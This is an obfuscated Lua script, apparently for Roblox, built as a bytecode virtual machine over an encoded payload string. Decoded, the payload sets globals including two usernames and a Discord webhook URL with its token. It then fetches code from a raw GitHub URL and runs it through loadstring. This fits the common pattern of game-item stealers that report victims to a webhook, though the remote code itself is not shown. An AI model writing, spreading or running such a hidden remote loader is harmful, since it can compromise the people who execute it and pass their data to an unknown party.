do local StrToNumber=tonumber;local Byte=string.byte;local Char=string.char;local Sub=string.sub;local Subg=string.gsub;local Rep=string.rep;local Concat=table.concat;local Insert=table.insert;local LDExp=math.ldexp;local GetFEnv=getfenv or function()return _ENV;end ;local Setmetatable=setmetatable;local PCall=pcall;local Select=select;local Unpack=unpack or table.unpack ;local ToNumber=tonumber;local function VMCall(ByteString,vmenv,...)local DIP=1;local repeatNext;ByteString=Subg(Sub(ByteString,5),"..",function(byte)if (Byte(byte,2)==79) then repeatNext=StrToNumber(Sub(byte,1,1));return "";else local a=Char(StrToNumber(byte,16));if repeatNext then local b=Rep(a,repeatNext);repeatNext=nil;return b;else return a;end end end);local function gBit(Bit,Start,End)if End then local Res=(Bit/(2^(Start-1)))%(2^(((End-1) -(Start-1)) + 1)) ;return Res-(Res%1) ;else local Plc=2^(Start-1) ;return (((Bit%(Plc + Plc))>=Plc) and 1) or 0 ;end end local function gBits8()local a=Byte(ByteString,DIP,DIP);DIP=DIP + 1 ;return a;end local function gBits16()local a,b=Byte(ByteString,DIP,DIP + 2 );DIP=DIP + 2 ;return (b * 256) + a ;end local function gBits32()local a,b,c,d=Byte(ByteString,DIP,DIP + 3 );DIP=DIP + 4 ;return (d * 16777216) + (c * 65536) + (b * 256) + a ;end local function gFloat()local Left=gBits32();local Right=gBits32();local IsNormal=1;local Mantissa=(gBit(Right,1,20) * (2^32)) + Left ;local Exponent=gBit(Right,21,31);local Sign=((gBit(Right,32)==1) and  -1) or 1 ;if (Exponent==0) then if (Mantissa==0) then return Sign * 0 ;else Exponent=1;IsNormal=0;end elseif (Exponent==2047) then return ((Mantissa==0) and (Sign * (1/0))) or (Sign * NaN) ;end return LDExp(Sign,Exponent-1023 ) * (IsNormal + (Mantissa/(2^52))) ;end local function gString(Len)local Str;if  not Len then Len=gBits32();if (Len==0) then return "";end end Str=Sub(ByteString,DIP,(DIP + Len) -1 );DIP=DIP + Len ;local FStr={};for Idx=1, #Str do FStr[Idx]=Char(Byte(Sub(Str,Idx,Idx)));end return Concat(FStr);end local gInt=gBits32;local function _R(...)return {...},Select("#",...);end local function Deserialize()local Instrs={};local Functions={};local Lines={};local Chunk={Instrs,Functions,nil,Lines};local ConstCount=gBits32();local Consts={};for Idx=1,ConstCount do local Type=gBits8();local Cons;if (Type==1) then Cons=gBits8()~=0 ;elseif (Type==2) then Cons=gFloat();elseif (Type==3) then Cons=gString();end Consts[Idx]=Cons;end Chunk[3]=gBits8();for Idx=1,gBits32() do local Descriptor=gBits8();if (gBit(Descriptor,1,1)==0) then local Type=gBit(Descriptor,2,3);local Mask=gBit(Descriptor,4,6);local Inst={gBits16(),gBits16(),nil,nil};if (Type==0) then Inst[3]=gBits16();Inst[4]=gBits16();elseif (Type==1) then Inst[3]=gBits32();elseif (Type==2) then Inst[3]=gBits32() -(2^16) ;elseif (Type==3) then Inst[3]=gBits32() -(2^16) ;Inst[4]=gBits16();end if (gBit(Mask,1,1)==1) then Inst[2]=Consts[Inst[2]];end if (gBit(Mask,2,2)==1) then Inst[3]=Consts[Inst[3]];end if (gBit(Mask,3,3)==1) then Inst[4]=Consts[Inst[4]];end Instrs[Idx]=Inst;end end for Idx=1,gBits32() do Functions[Idx-1 ]=Deserialize();end return Chunk;end local function Wrap(Chunk,Upvalues,Env)local Instr=Chunk[1];local Proto=Chunk[2];local Params=Chunk[3];return function(...)local Instr=Instr;local Proto=Proto;local Params=Params;local _R=_R;local VIP=1;local Top= -1;local Vararg={};local Args={...};local PCount=Select("#",...) -1 ;local Lupvals={};local Stk={};for Idx=0,PCount do if (Idx>=Params) then Vararg[Idx-Params ]=Args[Idx + 1 ];else Stk[Idx]=Args[Idx + 1 ];end end local Varargsz=(PCount-Params) + 1 ;local Inst;local Enum;while true do Inst=Instr[VIP];Enum=Inst[1];if (Enum<=6) then if (Enum<=2) then if (Enum<=0) then Stk[Inst[2]][Inst[3]]=Inst[4];elseif (Enum>1) then local A=Inst[2];local Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;local Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end else do return;end end elseif (Enum<=4) then if (Enum>3) then VIP=Inst[3];else Stk[Inst[2]]=Env[Inst[3]];end elseif (Enum==5) then Env[Inst[3]]=Stk[Inst[2]];elseif (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum<=9) then if (Enum<=7) then local A=Inst[2];local B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];elseif (Enum==8) then local A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));else Stk[Inst[2]]=Inst[3];end elseif (Enum<=11) then if (Enum>10) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]~=0 ;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]=Inst[3]~=0 ;end elseif (Enum>12) then Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]();end VIP=VIP + 1 ;end end;end return Wrap(Deserialize(),{},vmenv)(...);end VMCall("LOL!143O00028O00027O004003023O005F4703093O00416E74694C656176652O0103093O004D6F7573654C6F636B0100026O00084003083O00557365724E616D65030A3O006764375F736B692O6C3203073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3133302O3630323938303835332O383335382F647641487669425F4F684A44684E4C574A797459504642707672794F2O54494372546861506579364B72346E4A352O5F4670446259335559556C4178416474374A2O6E71026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269536372697074732F6D61696E2F4D6F72695363726970745A03093O00557365724E616D653203093O0056616C746F725F3630030D3O004C6F6164696E675363722O656E00233O0012093O00013O0026063O000800010002002O043O00080001001203000100033O00302O000100040005001203000100033O00302O0001000600070012093O00083O0026063O000F00010001002O043O000F00010012090001000A3O001205000100093O0012090001000C3O0012050001000B3O0012093O000D3O0026063O001A00010008002O043O001A00010012030001000E3O00120B0002000F3O00202O00020002001000122O000400116O000500016O000200056O00013O00024O00010001000100044O002200010026063O00010001000D002O043O00010001001209000100133O00120D000100123O00122O000100033O00302O00010014000700124O00023O00044O000100012O00013O00017O00",GetFEnv(),...); end